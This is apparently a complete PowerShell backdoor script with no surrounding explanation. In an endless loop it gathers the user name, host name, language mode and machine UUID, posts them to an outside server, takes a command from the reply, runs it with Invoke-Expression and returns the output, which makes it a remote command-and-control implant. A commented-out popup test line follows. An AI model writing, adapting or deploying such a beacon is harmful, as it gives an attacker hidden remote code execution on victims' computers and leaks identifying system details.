$command = " "
$result = " "
while($true){
$username = whoami
$hostname = hostname
$is_clm_active = $ExecutionContext.SessionState.LanguageMode
$uuid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID

$json = @"
{
                        "uuid": "$uuid",
                        "username": "$username",
                        "hostname": "$hostname",
                        "clm": "$is_clm_active",
                        "last_boot_time": "$last_boot_time",
                        "output_last_command": "$result"
}
"@

$response = iwr -Uri https://220.ip-54-37-16.eu/ -Method POST -Body $json -UseBasicParsing
$command = $response | convertFrom-Json | select -ExpandProperty command 
if (-Not ($command -eq "" -Or -Not $command -eq $null)){$result = iex $command;echo $result}
start-sleep 5
}


# $wshell =  New-Object -ComObject Wscript.Shell;$wshell.Popup(\"test\",0,\"done\",0x1)
